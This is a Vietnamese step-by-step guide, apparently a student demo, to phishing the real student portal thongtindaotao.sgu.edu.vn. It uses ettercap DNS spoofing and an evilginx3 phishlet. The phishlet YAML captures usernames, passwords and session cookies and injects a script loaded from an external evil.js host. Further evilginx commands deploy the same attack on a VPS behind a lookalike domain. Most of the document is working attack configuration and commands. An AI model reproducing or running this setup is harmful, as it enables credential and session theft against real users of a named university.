
## CHUẨN BỊ

- 1 MÁY KALI LINUX: IP 192.168.100.200
- 1 MÁY VICTIM: IP 192.168.100.150
- Default Gateway MẶC ĐỊNH CỦA 2 MÁY: 192.168.100.2
- 1 HOST ĐỂ UPLOAD MÃ JAVASCRIPT ĐỘC HẠI CHÈN VÀO [TÙY VÀO MỤC ĐÍCH THỰC THI CÓ CẦN INJECT JAVASCRIPT VÀO TRANG FAKE, NẾU KHÔNG CẦN BỎ QUA] [TRONG DEMO NÀY, SẼ CHÈN VÀO CUỐI CHỮ "Demo được thực hiện nhằm mục đích làm đồ án"]
- 
## TRONG MÁY KALILINUX:

```
nano /etc/ettercap/etter.dns
```
Thêm vào cuối trang:
```
thongtindaotao.sgu.edu.vn A 192.168.100.200
thongtindaotao.sgu.edu.vn PTR 192.168.100.200
```
Save lại

Bật terminal khác
```
sudo apt update && sudo apt install
```
```
git clone https://github.com/kgretzky/evilginx3.git
cd evilginx3
make
```
```
cd phishlets
nano demo.yaml
```
Thay địa chỉ <ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS> (YÊU CẦU DÙNG HTTPS)
```
name: sgu
author: yourname
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "thongtindaotao.sgu.edu.vn", replace: "thongtindaotao.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "</body>", replace: "<script src='https:///<ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS>'></script></body>", mimes: ["text/html", "application/javascript", "application/json"] }

auth_tokens:
  - domain: thongtindaotao.sgu.edu.vn
    keys: ['.*,regexp']

credentials:
  username:
    key: "username"
    search: "(.*)"
    type: post
  password:
    key: "password"
    search: "(.*)"
    type: post

login:
  domain: thongtindaotao.sgu.edu.vn
  path: /
```

## BẬT EVILGINX2 (Demo 1):

```
cd build
sudo ./evilginx -p ../phishlets -developer
phishlets hostname demo thongtindaotao.sgu.edu.vn
phishlets enable demo
lures create demo
lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.sgu.edu.vn LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
```

## BẬT EVILGINX2 TRÊN VPS (Demo 2):

```
sudo ./evilginx
phishlets hostname ttdt thongtindaotao.nodhsg.shop
phishlets enable ttdt
lures create ttdt
lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.nodhsg.shop LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
```

## BẬT ETTERCAP:
```ettercap -G```
QUY TRÌNH: SCAN HOST (THƯỜNG SẼ CHO RA KHOẢNG 4 HOST) --> ADD 192.168.100.150 VÀO TARGET 1 --> BẬT PLUGIN DNS SPOOF_DNS ĐỂ GỬI DNS QUERY CHO MÁY VICTIM 
KHI NÀY NGƯỜI DÙNG NẾU NHẬP thongtindaotao.sgu.edu.vn sẽ ra trang fake
